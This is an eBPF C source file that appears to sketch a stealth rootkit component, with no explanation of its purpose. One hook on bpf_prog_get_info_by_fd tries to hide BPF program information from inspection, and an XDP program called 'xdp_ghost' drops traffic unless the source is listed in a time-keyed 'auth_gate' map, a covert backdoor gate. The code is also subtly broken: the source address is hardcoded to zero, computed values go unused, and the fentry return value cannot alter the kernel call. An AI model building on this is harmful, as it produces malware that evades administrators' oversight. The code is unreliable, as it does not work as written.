#include <linux/bpf.h>
#include "bpf_helper_defs.h"

#define SEC(NAME) __attribute__((section(NAME), used))

char _license[] SEC("license") = "GPL";

struct task_struct {
    int pid;
    int tgid;
} __attribute__((preserve_access_index));

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 64);
    __uint(key_size, sizeof(unsigned int));
    __uint(value_size, sizeof(unsigned long long));
} auth_gate SEC(".maps");

SEC("fentry/bpf_prog_get_info_by_fd")
int mask_bpf(void *ctx) {
    return -2;
}

SEC("xdp")
int xdp_ghost(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    
    unsigned long long now = bpf_ktime_get_ns() / 30000000000;
    unsigned int magic = (unsigned int)(now ^ 0x5F5F5F5F);

    unsigned int src_ip = 0; 
    void *valid = bpf_map_lookup_elem(&auth_gate, &src_ip);
    
    if (!valid) return 1; // XDP_DROP
    return 2; // XDP_PASS
}
